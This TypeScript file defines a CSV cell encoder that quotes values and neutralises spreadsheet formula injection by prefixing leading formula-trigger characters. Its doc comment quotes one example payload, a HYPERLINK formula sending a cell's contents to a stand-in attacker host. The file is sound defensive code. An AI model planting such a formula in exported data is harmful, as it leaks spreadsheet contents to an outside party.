/**
 * One CSV cell, safe to open in Excel, Numbers, or Google Sheets.
 *
 * Quoting (with embedded quotes doubled) keeps commas and newlines inside
 * the cell, but it does not stop a spreadsheet from evaluating a value that
 * starts with a formula trigger. Several exported columns (waitlist
 * attribution: source, medium, campaign, referrer) are typed by anonymous
 * visitors, so a value like `=HYPERLINK("https://evil/?"&A2,"x")` would run
 * on the admin's machine when the export is opened. Per OWASP's CSV
 * injection guidance, a leading `=`, `+`, `-`, `@`, tab, or carriage return
 * gets a `'` prefix, which makes the spreadsheet treat the cell as text.
 */
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

export function csvCell(value: string): string {
  const safe = FORMULA_TRIGGER.test(value) ? `'${value}` : value;
  return `"${safe.replace(/"/g, '""')}"`;
}
